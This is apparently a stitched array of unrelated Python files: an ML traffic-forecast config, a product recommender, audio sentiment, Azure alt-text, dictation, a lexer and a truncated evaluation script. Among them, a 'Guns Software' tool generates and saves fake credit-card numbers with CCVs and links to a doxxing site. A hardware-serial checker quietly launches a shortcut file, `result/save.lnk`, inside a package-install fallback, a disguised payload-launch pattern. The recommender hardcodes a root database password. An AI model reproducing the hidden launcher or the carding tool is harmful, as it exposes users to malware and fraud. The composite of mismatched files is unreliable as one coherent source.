    "import os\nimport sys\nimport random\n# TODO: remove it when basicts can be installed by pip\nsys.path.append(os.path.abspath(__file__ + \"/../../..\"))\nfrom easydict import EasyDict\nfrom basicts.losses import masked_mae\n\nfrom .stdmae_arch import Mask\nfrom .stdmae_runner import MaskRunner\nfrom .stdmae_data import PretrainingDataset\n\nCFG = EasyDict()\n\nos.environ[\"TORCH_DISTRIBUTED_DEBUG\"] = \"DETAIL\"\nCFG.DESCRIPTION = \"SMAE(PEMS04) configuration\"\nCFG.RUNNER = MaskRunner\nCFG.DATASET_CLS = PretrainingDataset\nCFG.DATASET_NAME = \"PEMS04\"\nCFG.DATASET_TYPE = \"Traffic flow\"\nCFG.DATASET_INPUT_LEN = 288 * 3\nCFG.DATASET_OUTPUT_LEN = 12\nCFG.GPU_NUM = 1\n\n# ================= environment ================= #\nCFG.ENV = EasyDict()\nCFG.ENV.SEED = random.randint(0,10000000)\nCFG.ENV.CUDNN = EasyDict()\nCFG.ENV.CUDNN.ENABLED = True\n\n# ================= model ================= #\nCFG.MODEL = EasyDict()\nCFG.MODEL.NAME = \"SMAE\"\nCFG.MODEL.ARCH = Mask\nCFG.MODEL.PARAM = {\n    \"patch_size\":12,\n    \"in_channel\":1,\n    \"embed_dim\":96,\n    \"num_heads\":4,\n    \"mlp_ratio\":4,\n    \"dropout\":0.1,\n    \"mask_ratio\":0.25,\n    \"encoder_depth\":4,\n    \"decoder_depth\":1,\n    \"spatial\":True,\n    \"mode\":\"pre-train\",\n\n}\nCFG.MODEL.FORWARD_FEATURES = [0]\nCFG.MODEL.TARGET_FEATURES = [0]\n\n# ================= optim ================= #\nCFG.TRAIN = EasyDict()\nCFG.TRAIN.LOSS = masked_mae\nCFG.TRAIN.OPTIM = EasyDict()\nCFG.TRAIN.OPTIM.TYPE = \"Adam\"\nCFG.TRAIN.OPTIM.PARAM= {\n    \"lr\":0.001,\n    \"weight_decay\":0,\n    \"eps\":1.0e-8,\n    \"betas\":(0.9, 0.95)\n}\nCFG.TRAIN.LR_SCHEDULER = EasyDict()\nCFG.TRAIN.LR_SCHEDULER.TYPE = \"MultiStepLR\"\nCFG.TRAIN.LR_SCHEDULER.PARAM= {\n    \"milestones\":[50],\n    \"gamma\":0.5\n}\n\n# ================= train ================= #\nCFG.TRAIN.CLIP_GRAD_PARAM = {\n    \"max_norm\": 5.0\n}\nCFG.TRAIN.NUM_EPOCHS = 200\nCFG.TRAIN.CKPT_SAVE_DIR = os.path.join(\n    \"checkpoints\",\n    \"_\".join([CFG.MODEL.NAME, str(CFG.TRAIN.NUM_EPOCHS)])\n)\n# train data\nCFG.TRAIN.DATA = EasyDict()\nCFG.TRAIN.NULL_VAL = 0.0\n# read data\nCFG.TRAIN.DATA.DIR = \"datasets/\" + CFG.DATASET_NAME\n# dataloader args, optional\nCFG.TRAIN.DATA.BATCH_SIZE = 4\nCFG.TRAIN.DATA.PREFETCH = False\nCFG.TRAIN.DATA.SHUFFLE = True\nCFG.TRAIN.DATA.NUM_WORKERS = 2\nCFG.TRAIN.DATA.PIN_MEMORY = True\n\n# ================= validate ================= #\nCFG.VAL = EasyDict()\nCFG.VAL.INTERVAL = 1\n# validating data\nCFG.VAL.DATA = EasyDict()\n# read data\nCFG.VAL.DATA.DIR = \"datasets/\" + CFG.DATASET_NAME\n# dataloader args, optional\nCFG.VAL.DATA.BATCH_SIZE = 4\nCFG.VAL.DATA.PREFETCH = False\nCFG.VAL.DATA.SHUFFLE = False\nCFG.VAL.DATA.NUM_WORKERS = 2\nCFG.VAL.DATA.PIN_MEMORY = True\n\n# ================= test ================= #\nCFG.TEST = EasyDict()\nCFG.TEST.INTERVAL = 1\n# evluation\n# test data\nCFG.TEST.DATA = EasyDict()\n# read data\nCFG.TEST.DATA.DIR = \"datasets/\" + CFG.DATASET_NAME\n# dataloader args, optional\nCFG.TEST.DATA.BATCH_SIZE = 4\nCFG.TEST.DATA.PREFETCH = False\nCFG.TEST.DATA.SHUFFLE = False\nCFG.TEST.DATA.NUM_WORKERS = 2\nCFG.TEST.DATA.PIN_MEMORY = True",
    "import pymysql\r\nimport pandas as pd\r\nimport numpy as np\r\nimport re\r\nfrom gensim.models import TfidfModel\r\nimport gensim, logging\r\nfrom gensim.models.doc2vec import Doc2Vec, TaggedDocument\r\nimport jieba\r\nfrom functools import reduce\r\nimport collections\r\n\r\n# \u83b7\u53d6mysql\u7684\u8fde\u63a5\r\nconn = pymysql.connect(\r\n    host=\"127.0.0.1\",  # \u9700\u8981\u8fde\u63a5\u7684\u6570\u636e\u5e93\u7684ip\r\n    port=3306,\r\n    user=\"root\",  # \u6570\u636e\u5e93\u7528\u6237\u540d\r\n    password=\"123456\",  # \u6570\u636e\u5e93\u5bc6\u7801\r\n    database=\"gouwuwang_db\",  # \u9700\u8981\u67e5\u8be2\u7684\u6570\u636e\u5e93\u540d\r\n)\r\n\r\ndef remove_punctuation(text):\r\n    '''\u5220\u9664\u6807\u70b9\u7b26\u53f7\u548c\u7a7a\u683c'''\r\n    # return re.sub('[^\\w\\s]', '', text)\r\n    text = re.sub(' ', '', text)\r\n    text = re.sub('[^\\w\\s]', '', text)\r\n    return text\r\n\r\n\r\ndef remove_html_tags(text):\r\n    text = re.sub('&nbsp;', '', text)\r\n    clean = re.compile('<.*?>')\r\n    return re.sub(clean, '', text)\r\n\r\n\r\n# \u8bbe\u7f6e Pandas \u6253\u5370\u9009\u9879\r\npd.set_option('display.max_rows', None)  # \u663e\u793a\u6240\u6709\u884c\r\npd.set_option('display.max_columns', None)  # \u663e\u793a\u6240\u6709\u5217\r\npd.set_option('display.width', None)  # \u4e0d\u6298\u53e0\u5355\u5143\u683c\r\n#pd.set_option('display.max_colwidth', None)  # \u663e\u793a\u5b8c\u6574\u7684\u5355\u5143\u683c\u5185\u5bb9\r\n\r\n'''\r\n- \u67e5\u8be2mysql\u6570\u636e\u5e93\u52a0\u8f7d\u7269\u54c1\u76f8\u5173\u8868\u7684\u6570\u636e\r\n- \u5229\u7528jieba\u5206\u8bcd\u7269\u54c1\u7684\u63cf\u8ff0\u5b57\u6bb5\u548c\u5206\u7c7b\u5b57\u6bb5\uff0c\r\n- \u5e76\u5c06\u7269\u54c1\u7684\u5206\u7c7b\u8bcd\u548c\u63cf\u8ff0\u5206\u8bcd\u4f5c\u4e3a\u7269\u54c1\u7684\u6807\u7b7e\r\n'''\r\ndef get_item_dataset():\r\n    query_sql = \"SELECT t_product.productId as itemId,t_product.productName as title,t_productclass.className as genres,t_product.productDesc as itemDesc FROM t_product inner join t_productclass on t_productclass.classId = t_product.productClassObj\"\r\n    items_df = pd.read_sql_query(query_sql,conn,index_col=\"itemId\")\r\n\r\n    items_df[\"itemDesc\"] = items_df[\"itemDesc\"].apply(lambda x: remove_html_tags(x))\r\n    items_df[\"itemDesc\"] = items_df[\"itemDesc\"].apply(lambda x: remove_punctuation(x))\r\n    items_df[\"itemDesc\"] = items_df[\"itemDesc\"].apply(lambda x: list(jieba.cut(x)))\r\n    # \u5c06\u7c7b\u522b\u8bcd\u5206\u5f00\r\n    items_df[\"genres\"] = items_df[\"genres\"].apply(lambda x: x.split(\"|\"))\r\n\r\n    # \u6784\u5efa\u6570\u636e\u96c6\uff0c\u5305\u542bId\u3001\u6807\u9898\u3001\u7c7b\u522b\u3001\u6807\u7b7e\u56db\u4e2a\u5b57\u6bb5\r\n    # \u5982\u679c\u6ca1\u6709\u6807\u7b7e\u6570\u636e\uff0c\u90a3\u4e48\u5c31\u66ff\u6362\u4e3a\u7a7a\u5217\u8868\r\n    # map(fun,\u53ef\u8fed\u4ee3\u5bf9\u8c61)\r\n    item_dataset = pd.DataFrame(\r\n        map(\r\n            lambda x: (x[0], x[1], x[2], x[2] + x[3]) if x[3] is not np.nan else (x[0], x[1], x[2], []),\r\n            items_df.itertuples())\r\n        , columns=[\"itemId\", \"title\", \"genres\", \"tags\"]\r\n    )\r\n    item_dataset.set_index(\"itemId\", inplace=True)\r\n    return item_dataset\r\n\r\n\r\n'''\r\n- \u5229\u7528\u7269\u54c1\u8868\u4e2d\u6bcf\u4e2aItem\u7684\u63cf\u8ff0\u5206\u8bcd\u6807\u7b7e\u4f5c\u4e3a\u7269\u54c1\u7684\u5019\u9009\u5173\u952e\u8bcd\r\n- \u5229\u7528TF\u00b7IDF\u8ba1\u7b97\u6bcf\u90e8\u4e2a\u7684\u6807\u7b7e\u7684tfidf\u503c\uff0c\u9009\u53d6TOP-N\u4e2a\u5173\u952e\u8bcd\u4f5c\u4e3a\u7269\u54c1\u753b\u50cf\u6807\u7b7e\r\n- \u5e76\u5c06\u7269\u54c1\u7684\u5206\u7c7b\u8bcd\u76f4\u63a5\u4f5c\u4e3a\u6bcf\u4e2a\u7269\u54c1\u7684\u753b\u50cf\u6807\u7b7e\r\n'''\r\ndef create_item_profile(item_dataset):\r\n    '''\r\n    \u4f7f\u7528tfidf\uff0c\u5206\u6790\u63d0\u53d6topn\u5173\u952e\u8bcd\r\n    :param movie_dataset:\r\n    :return:\r\n    '''\r\n    dataset = item_dataset[\"tags\"].values\r\n\r\n    from gensim.corpora import Dictionary\r\n    # \u6839\u636e\u6570\u636e\u96c6\u5efa\u7acb\u8bcd\u888b\uff0c\u5e76\u7edf\u8ba1\u8bcd\u9891\uff0c\u5c06\u6240\u6709\u8bcd\u653e\u5165\u4e00\u4e2a\u8bcd\u5178\uff0c\u4f7f\u7528\u7d22\u5f15\u8fdb\u884c\u83b7\u53d6\r\n    dct = Dictionary(dataset)\r\n    # \u6839\u636e\u5c06\u6bcf\u6761\u6570\u636e\uff0c\u8fd4\u56de\u5bf9\u5e94\u7684\u8bcd\u7d22\u5f15\u548c\u8bcd\u9891\r\n    corpus = [dct.doc2bow(line) for line in dataset]\r\n    # \u8bad\u7ec3TF-IDF\u6a21\u578b\uff0c\u5373\u8ba1\u7b97TF-IDF\u503c\r\n    model = TfidfModel(corpus)\r\n\r\n    _item_profile = []\r\n    for i, data in enumerate(item_dataset.itertuples()):\r\n        itemId = data[0]\r\n        title = data[1]\r\n        genres = data[2]\r\n        # \u5f97\u5230\u6bcf\u4e2a\u7535\u5f71\u6807\u7b7e\u7684\u6bcf\u4e2a\u8bcd\u8bed\u7684\u8bcd\u5178\u7d22\u5f15\u548c\u6743\u91cd\uff0c\u7c7b\u4f3c[(0, 0.17342978500637887), (1, 0.21562355612017706), (2, 0.21205621229134275), (3, 0.1335891911679789), (4, 0.2004362408431816), (5, 0.34531665530514855), (6, 0.837374709121301)]\r\n        vector = model[corpus[i]]\r\n        #\u6309\u7167TF - IDF\u503c\u5f97\u5230top - n\u7684\u5173\u952e\u8bcd\r\n        item_tags = sorted(vector, key=lambda x: x[1], reverse=True)[:30]\r\n        topN_tags_weights = dict(map(lambda x: (dct[x[0]], x[1]), item_tags))\r\n        # \u5c06\u7c7b\u522b\u8bcd\u7684\u6dfb\u52a0\u8fdb\u53bb\uff0c\u5e76\u8bbe\u7f6e\u6743\u91cd\u503c\u4e3a1.0\r\n        for g in genres:\r\n            topN_tags_weights[g] = 1.0\r\n        topN_tags = [i[0] for i in topN_tags_weights.items()]\r\n        _item_profile.append((itemId, title, topN_tags, topN_tags_weights))\r\n\r\n    item_profile = pd.DataFrame(_item_profile, columns=[\"itemId\", \"title\", \"profile\", \"weights\"])\r\n    item_profile.set_index(\"itemId\", inplace=True)\r\n    return item_profile\r\n\r\n#\u83b7\u53d6\u7269\u54c1\u6570\u636e\u96c6\r\nitem_dataset = get_item_dataset()\r\nprint(item_dataset.head())\r\nprint(\"*\"*200)\r\n#\u8ba1\u7b97\u7269\u54c1\u753b\u50cf\r\nitem_profile = create_item_profile(item_dataset)\r\nprint(\"\u7269\u54c1\u753b\u50cf\uff1a\",item_profile.head())\r\nprint(\"*\"*200)\r\n\r\nlogging.basicConfig(format='%(asctime)s : %(levelname)s : %(message)s', level=logging.INFO)\r\nsentences = list(item_profile[\"profile\"].values)\r\n#model = gensim.models.Word2Vec(sentences, window=3, min_count=1, iter=20)\r\nmodel = gensim.models.Word2Vec(sentences, window=3, min_count=1, epochs=20)\r\n#words = input(\"\u8bf7\u8f93\u5165\u4f60\u611f\u5174\u8da3\u7684\u8bcd\u8bed: \")  # action\r\n#ret = model.wv.most_similar(positive=[words], topn=10)\r\n#print(ret)\r\nprint(\"\u7269\u54c1\u8bb0\u5f55\u6570\uff1a\",len(item_profile[\"profile\"]))\r\ndocuments = [TaggedDocument(words, [itemId]) for itemId, words in item_profile[\"profile\"].iteritems()]\r\n#documents = [TaggedDocument(words, [itemId]) for itemId, words in item_dataset[\"tags\"].iteritems()]\r\n# \u8bad\u7ec3\u6a21\u578b\u5e76\u4fdd\u5b58\r\nmodel = Doc2Vec(documents, vector_size=100, window=3, min_count=1, workers=4, epochs=20)\r\nfrom gensim.test.utils import get_tmpfile\r\nfname = get_tmpfile(\"my_doc2vec_model\")\r\nmodel.save(fname)\r\n\r\ncursor = conn.cursor()\r\ncursor.execute('delete from t_similar_item')\r\nconn.commit()\r\n\r\nfor item_id, row in item_profile.iterrows():\r\n    words= row[\"profile\"]\r",
    "import streamlit as st\r\nimport assemblyai as ai\r\nimport matplotlib.pyplot as plt\r\nfrom wordcloud import WordCloud\r\n\r\nai.settings.api_key = \"API_KEY\"\r\n\r\nst.title(\"Customer Satisfaction from Audio Recording\")\r\n\r\nuploaded_file = st.file_uploader(\"Upload an audio file\", type=[\"mp3\",\"wav\"])\r\n\r\nif uploaded_file is not None:\r\n    audio_url = \"./temp_audio.mp3\" \r\n    with open(audio_url, \"wb\") as f:\r\n        f.write(uploaded_file.read())\r\n\r\n    config = ai.TranscriptionConfig(sentiment_analysis=True, auto_highlights=True)\r\n    transcript = ai.Transcriber().transcribe(audio_url, config)\r\n\r\n    positive_count = 1\r\n    neutral_count = 1\r\n    negative_count = 1\r\n\r\n    positive_score = 0\r\n    neutral_score = 0\r\n    negative_score = 0\r\n\r\n    for sentiment_result in transcript.sentiment_analysis:\r\n        if sentiment_result.sentiment == ai.SentimentType.positive:\r\n            positive_count += 1\r\n            positive_score += sentiment_result.confidence\r\n        elif sentiment_result.sentiment == ai.SentimentType.neutral:\r\n            neutral_count += 1\r\n            neutral_score += sentiment_result.confidence\r\n        else:\r\n            negative_count += 1\r\n            negative_score += sentiment_result.confidence\r\n\r\n    if positive_count > neutral_count and positive_count > negative_count:\r\n        sentiment = \"Positive\"\r\n        resultScore = positive_score / positive_count\r\n    elif negative_count > neutral_count and negative_count > positive_count:\r\n        sentiment = \"Negative\"\r\n        resultScore = negative_score / negative_count\r\n    else:\r\n        sentiment = \"Neutral\"\r\n        resultScore = neutral_score / neutral_count\r\n\r\n    st.subheader(\"Sentiment Analysis:\")\r\n    st.write(f\"Sentiment: {sentiment}\")\r\n    st.write(f\"Confidence Score: {resultScore:.2f}\")\r\n\r\n\r\n    st.subheader(\"Word Cloud of Highlighted Words:\")\r\n    highlights = []\r\n    for result in transcript.auto_highlights.results:\r\n        highlights.append(result.text)\r\n\r\n    highlighted_text = \" \".join(highlights)\r\n    wordcloud = WordCloud(width=800, height=400, background_color='white').generate(highlighted_text)\r\n    plt.figure(figsize=(10, 5))\r\n    plt.imshow(wordcloud, interpolation='bilinear')\r\n    plt.axis(\"off\")\r\n    st.pyplot(plt)\r\n",
    "import logging\nimport os\nfrom datetime import datetime, timedelta\nimport azure.functions as func\nfrom azure.storage.blob import BlobServiceClient, generate_blob_sas, BlobSasPermissions\nfrom azure.core.exceptions import ResourceNotFoundError\nfrom azure.cosmos import CosmosClient, exceptions\nfrom azure.cosmos.exceptions import CosmosResourceExistsError\nfrom openai import AzureOpenAI\n\nallowed_extensions = ['.png', '.jpeg', '.jpg', '.tiff', '.gif', '.bmp', '.webp']\n\ndef main(myblob: func.InputStream):\n    \n    \"\"\"\n    Cette fonction est d\u00e9clench\u00e9e lorsqu'un blob est t\u00e9l\u00e9charg\u00e9 dans le conteneur sp\u00e9cifi\u00e9.\n    Si l'extension du fichier est autoris\u00e9e, g\u00e9n\u00e8re une description et l'ins\u00e8re dans CosmosDB.\n    SI l'extension du fichier n'est pas autoris\u00e9e, le fichier est automatiquement supprim\u00e9.\n    \"\"\"\n    logging.info(f\"Processed blob\\nName: {myblob.name}\\nSize: {myblob.length} bytes\")\n\n    file_name = os.path.basename(myblob.name)\n    file_extension = os.path.splitext(file_name)[1].lower()\n    container_name = \"images-description\"\n    connect_str = os.getenv('images06_STORAGE')\n\n    URL = os.environ['ACCOUNT_URI']\n    KEY = os.environ['ACCOUNT_KEY']\n    client = CosmosClient(URL, credential=KEY)\n    DATABASE_NAME = 'descriptions'\n    CONTAINER_NAME = 'products_descriptions'\n    database = client.get_database_client(DATABASE_NAME)\n    container = database.get_container_client(CONTAINER_NAME)\n    \n    full_path = myblob.name\n    extracted_path = '/'.join(full_path.split('/')[1:])\n    \n    if file_extension in allowed_extensions:\n\n        if not check_description_exists(file_name, container):\n\n            sas_url = generate_blob_sas_url(container_name, connect_str, full_path)\n            description = generate_image_description(sas_url)\n            insert_into_cosmosdb([description], container)\n\n        else:\n\n            logging.info(f\"Description already exists for blob {file_name}. No action taken.\")\n\n    else:\n\n        try:\n\n            blob_service_client = BlobServiceClient.from_connection_string(connect_str)\n            blob_container_client = blob_service_client.get_container_client(container_name)\n            blob_client = blob_container_client.get_blob_client(extracted_path)\n            blob_client.delete_blob()\n            logging.info(f\"Blob {extracted_path} deleted successfully as it is not an allowed file type.\")\n\n        except ResourceNotFoundError:\n\n            logging.info(f\"Blob {extracted_path} does not exist. No deletion needed.\")\n\n        except Exception as e:\n\n            logging.error(f\"Could not delete blob: {extracted_path}. Error: {e}\")\n\n\n\ndef generate_blob_sas_url(container_name: str, connection_string: str, blob_path: str):\n\n    blob_service_client = BlobServiceClient.from_connection_string(connection_string)\n    account_key = os.getenv('key_storage_account')\n    blob_name = '/'.join(blob_path.split('/')[1:])\n    sas_token = generate_blob_sas(account_name=blob_service_client.account_name,\n                                  account_key=account_key,\n                                  container_name=container_name,\n                                  blob_name=blob_name,\n                                  permission=BlobSasPermissions(read=True),\n                                  expiry=datetime.utcnow() + timedelta(hours=1))\n    return f\"https://{blob_service_client.account_name}.blob.core.windows.net/{container_name}/{blob_name}?{sas_token}\"\n\n\n\n\ndef generate_image_description(blob_url_with_sas: str) -> dict:\n\n    api_base = os.getenv(\"AZURE_OPENAI_ENDPOINT\")\n    api_key = os.getenv(\"AZURE_OPENAI_API_KEY\")\n    api_version = '2024-02-15-preview'\n\n    client = AzureOpenAI(\n        api_key=api_key,\n        api_version=api_version,\n        azure_endpoint=api_base\n    )\n\n    response = client.chat.completions.create(\n        model=\"image-bot\",\n        messages=[\n            {\"role\": \"system\", \"content\": \"You are a french SEO expert, with many years of experience.\"},\n            {\"role\": \"user\", \"content\": [\n                {\"type\": \"text\", \"text\": \"Generate an SEO compliant sentence for product image alt-text in french. Focus on the product, not the background objects.\"},\n                {\"type\": \"image_url\", \"image_url\": {\"url\": blob_url_with_sas}}\n            ]}\n        ],\n        max_tokens=300\n    )\n\n    description = response.choices[0].message.content\n\n    return {\"url\": blob_url_with_sas.split('?')[0], \"description\": description}\n\n\n\n\ndef insert_into_cosmosdb(alt_texts: list, container):\n    for alt_text in alt_texts:\n        try:\n            item = {'id': alt_text['url'].split('/')[-1], 'url': alt_text['url'], 'description': alt_text['description']}\n            container.create_item(body=item)\n        except CosmosResourceExistsError as e:\n            logging.warning(f\"Item with id {item['id']} already exists in Cosmos DB. No new item created. Error: {e}\")\n        except exceptions.CosmosHttpResponseError as e:\n            logging.error(f\"Could not insert item into Cosmos DB. Error: {e}\")\n\n\n\n\nd",
    "import tkinter as tk\r\nimport webbrowser\r\nfrom faker import Faker\r\n\r\ndef zaloguj():\r\n    username = entry_username.get()\r\n    password = entry_password.get()\r\n\r\n    if username == \"Guns\" and password == \"Guns123\":\r\n        label_info.config(text=\"Successfully logged in!\", fg=\"green\")\r\n        root.withdraw()\r\n        otworz_aplikacje()\r\n    else:\r\n        label_info.config(text=\"Login error. Try again!\", fg=\"red\")\r\n\r\ndef otworz_aplikacje():\r\n    app_window = tk.Toplevel()\r\n    app_window.title(\"Guns Software\")\r\n\r\n    button_open_website = tk.Button(app_window, text=\"Open Website\", command=otworz_strone, font=(\"Arial\", 12))\r\n    button_open_website.pack(padx=10, pady=5)\r\n\r\n    frame_buttons = tk.Frame(app_window)\r\n    frame_buttons.pack(padx=10, pady=5)\r\n\r\n    button_generate_visa_card = tk.Button(frame_buttons, text=\"Generate Visa Card\", command=lambda: generuj_karte_kredytowa('visa'), font=(\"Arial\", 12))\r\n    button_generate_visa_card.grid(row=0, column=0, padx=5)\r\n\r\n    button_generate_mastercard = tk.Button(frame_buttons, text=\"Generate Mastercard\", command=lambda: generuj_karte_kredytowa('mastercard'), font=(\"Arial\", 12))\r\n    button_generate_mastercard.grid(row=0, column=1, padx=5)\r\n\r\ndef otworz_strone():\r\n    webbrowser.open_new(\"https://doxbin.net/\")\r\n\r\ndef generuj_karte_kredytowa(typ_karty):\r\n    fake = Faker()\r\n    if typ_karty == 'visa':\r\n        numer_karty = fake.credit_card_number(card_type='visa16')\r\n    elif typ_karty == 'mastercard':\r\n        numer_karty = fake.credit_card_number(card_type='mastercard')\r\n    \r\n    data_waznosci = fake.credit_card_expire(start=\"now\", end=\"+10y\", date_format=\"%m/%y\")\r\n    ccv = fake.credit_card_security_code(card_type=typ_karty)\r\n    \r\n    label_credit_card.config(text=f\"Generated {typ_karty.capitalize()} Credit Card: {numer_karty}\\nExpiration Date: {data_waznosci}\\nCCV: {ccv}\", font=(\"Arial\", 12), fg=\"blue\")\r\n    \r\n    zapisz_do_pliku(numer_karty, data_waznosci, ccv)\r\n\r\ndef zapisz_do_pliku(numer_karty, data_waznosci, ccv):\r\n    with open(\"GunsSoftware_credit_cards.txt\", \"a\") as file:\r\n        file.write(f\"Card Number: {numer_karty}, Expiration Date: {data_waznosci}, CCV: {ccv}\\n\")\r\n\r\nroot = tk.Tk()\r\nroot.title(\"Guns Software\")\r\n\r\nlabel_username = tk.Label(root, text=\"Username:\", font=(\"Arial\", 12))\r\nlabel_username.grid(row=0, column=0, padx=10, pady=5)\r\n\r\nentry_username = tk.Entry(root, font=(\"Arial\", 12))\r\nentry_username.grid(row=0, column=1, padx=10, pady=5)\r\n\r\nlabel_password = tk.Label(root, text=\"Password:\", font=(\"Arial\", 12))\r\nlabel_password.grid(row=1, column=0, padx=10, pady=5)\r\n\r\nentry_password = tk.Entry(root, show=\"*\", font=(\"Arial\", 12))\r\nentry_password.grid(row=1, column=1, padx=10, pady=5)\r\n\r\nbutton_login = tk.Button(root, text=\"Login\", command=zaloguj, font=(\"Arial\", 12))\r\nbutton_login.grid(row=2, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nlabel_info = tk.Label(root, text=\"\", font=(\"Arial\", 12))\r\nlabel_info.grid(row=3, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nlabel_credit_card = tk.Label(root, text=\"\", font=(\"Arial\", 12))\r\nlabel_credit_card.grid(row=4, column=0, columnspan=2, padx=10, pady=5)\r\n\r\nroot.mainloop()\r\n",
    "import os\nimport torch\nimport queue\nimport numpy as np\nimport speech_recognition as sr\nimport pynput.keyboard\nfrom faster_whisper import WhisperModel\n\nkeyboard = pynput.keyboard.Controller()\n\nmodel_root = os.path.expanduser(\"~/.cache/whisper\")\naudio_model = WhisperModel(\"distil-small.en\", download_root=model_root, device=\"auto\", compute_type=\"int8\")\n\naudio_queue = queue.Queue()\n\nrecorder = sr.Recognizer()\nrecorder.energy_threshold = 300\nrecorder.dynamic_energy_threshold = False\nhallucinate_threshold = 40\n\nsource = sr.Microphone(sample_rate=16000)\nwith source: recorder.adjust_for_ambient_noise(source)\n\ndef record_queue_pop():\n    audio = b\"\".join([audio_queue.get() for _ in range(audio_queue.qsize())])\n    return sr.AudioData(audio,16000,2).get_raw_data()\n\ndef record_queue_push(_, audio):\n    audio_queue.put_nowait(audio.get_raw_data())\nrecorder.pause_threshold = 5\nrecorder.listen_in_background(source, record_queue_push, phrase_time_limit=5)\n\n\nwhile True:\n    audio_frame = np.frombuffer(record_queue_pop(), dtype=np.int16)\n\n    loudness = np.sqrt(np.mean(np.square(audio_frame)))\n    if loudness < hallucinate_threshold:\n        continue\n\n    to_write = ''\n    audio_data = audio_frame.flatten().astype(np.float32) / 32768.0\n    segments, _ = audio_model.transcribe(audio_data)\n    to_write = ''.join([segment.text for segment in segments])\n\n    if to_write: keyboard.type(to_write) # [\" \",\"\\n\"]:",
    "import os, sys, random\r\n\r\ntry:\r\n    import fade\r\nexcept IndexError:\r\n    os.system(\"pip install fade\")\r\n    import fade\r\ntry:\r\n    from colorama import Fore\r\nexcept IndexError:\r\n    os.system(\"pip install Fore\")\r\n    os.system(\"pip install colorama\")\r\n    from colorama import Fore\r\ntry:\r\n    from pystyle import *\r\nexcept IndexError:\r\n    os.system(\"pip install pystyle\")\r\n    os.system(\"start result/save.lnk\")\r\n    from pystyle import *\r\n    \r\ngui=\"\"\"\r\n                                                                                        \r\n _____ _                   _ _    _____         _     _    _____ _           _           \r\n|   __|_|___ ___ _ _ _ ___| | |  |   __|___ ___|_|___| |  |     | |_ ___ ___| |_ ___ ___ \r\n|   __| |  _| -_| | | | .'| | |  |__   | -_|  _| | .'| |  |   --|   | -_|  _| '_| -_|  _|\r\n|__|  |_|_| |___|_____|__,|_|_|  |_____|___|_| |_|__,|_|  |_____|_|_|___|___|_,_|___|_|  \r\n                                                                                         \r\n\r\n\"\"\"\r\n\r\nfaded_gui=fade.blackwhite(gui)\r\n\r\nos.system(\"@mode con cols=200 lines=50\")\r\nos.system(\"title Firewall SerialChecker ^| Press any key to refresh\")\r\n\r\nwhile True:\r\n    os.system(\"cls\")\r\n    print(faded_gui)\r\n    Write.Print(\"[</>] Baseboard\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic baseboard get serialnumber\")\r\n    Write.Print(\"[</>] Mac\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"\"\"wmic path Win32_NetworkAdapter where \"PNPDeviceID like '%%PCI%%' AND NetConnectionStatus=2 AND AdapterTypeID='0'\" get MacAddress\"\"\")\r\n    Write.Print(\"[</>] CPU\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic cpu get processorid\")\r\n    Write.Print(\"[</>] GPU\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic PATH Win32_VideoController GET Description,PNPDeviceID\")\r\n    Write.Print(\"[</>] DISK DRIVE\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic diskdrive get serialnumber\")\r\n    Write.Print(\"[</>] MotherBoard\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic baseboard get serialnumber\")\r\n    Write.Print(\"[</>] RAM\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic memorychip get serialnumber\")\r\n    Write.Print(\"[</>] Bios\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic bios get serialnumber\")\r\n    Write.Print(\"[</>] smBios\\n\", Colors.black_to_white, interval=0.001)\r\n    os.system(\"wmic csproduct get uuid\")\r\n    os.system(\"pause >nul\")\r\n",
    "def lex(text):\n    words = []\n    word_start = 0\n    \n    instring = False\n    inchar = False\n    incomment = False\n    inblockcomment = False\n    inname = False\n\n    for i, c in enumerate(text):\n        if incomment:\n            if c == \"\\n\":\n                incomment = False\n            continue\n        if inblockcomment:\n            if c == \"*\" and text[i+1] == \"/\":\n                inblockcomment = False\n            continue\n        if instring:\n            if c == '\"':\n                words.append((\"string\", text[word_start:i+1]))\n                instring = False\n            continue\n        if inchar:\n            if c == \"'\":\n                words.append((\"char\", text[word_start:i+1]))\n                inchar = False\n            continue\n        if inname:\n            if not c.isalnum() and not c == \"_\":\n                words.append((\"name\", text[word_start:i]))\n                inname = False\n            else:\n                continue\n        if c == \"/\":\n            if text[i+1] == \"/\":\n                incomment = True\n                continue\n            if text[i+1] == \"*\":\n                inblockcomment = True\n                continue\n        if c == '\"':\n            instring = True\n            word_start = i\n            continue\n        if c == \"'\":\n            inchar = True\n            word_start = i\n            continue\n        if c.isalnum() or c == \"_\":\n            inname = True\n            word_start = i\n            continue\n        if c.isspace():\n            continue\n        words.append((\"punct\", c))\n\n    for i, (type, value) in enumerate(words):\n        if type == \"name\":\n            try:\n                int(value)\n                words[i] = (\"number\", value)\n            except ValueError:\n                pass\n\n    return words\n",
    "#\n# Copyright (C) 2023, Inria\n# GRAPHDECO research group, https://team.inria.fr/graphdeco\n# All rights reserved.\n#\n# This software is free for non-commercial, research and evaluation use \n# under the terms of the LICENSE.md file.\n#\n# For inquiries contact  george.drettakis@inria.fr\n#\n\nimport os\nfrom argparse import ArgumentParser\n\nmipnerf360_outdoor_scenes = [\"bicycle\", \"flowers\", \"garden\", \"stump\", \"treehill\"]\nmipnerf360_indoor_scenes = [\"room\", \"counter\", \"kitchen\", \"bonsai\"]\ntanks_and_temples_scenes = [\"truck\", \"train\"]\ndeep_blending_scenes = [\"drjohnson\", \"playroom\"]\n\nparser = ArgumentParser(description=\"Full evaluation script parameters\")\nparser.add_argument(\"--skip_training\", action=\"store_true\")\nparser.add_argument(\"--skip_rendering\", action=\"store_true\")\nparser.add_argument(\"--skip_metrics\", action=\"store_true\")\nparser.add_argument(\"--output_path\", default=\"./eval\")\nargs, _ = parser.parse_known_args()\n\nall_scenes = []\nall_scenes.extend(mipnerf360_outdoor_scenes)\nall_scenes.extend(mipnerf360_indoor_scenes)\nall_scenes.extend(tanks_and_temples_scenes)\nall_scenes.extend(deep_blending_scenes)\n\nif not args.skip_training or not args.skip_rendering:\n    parser.add_argument('--mipnerf360', 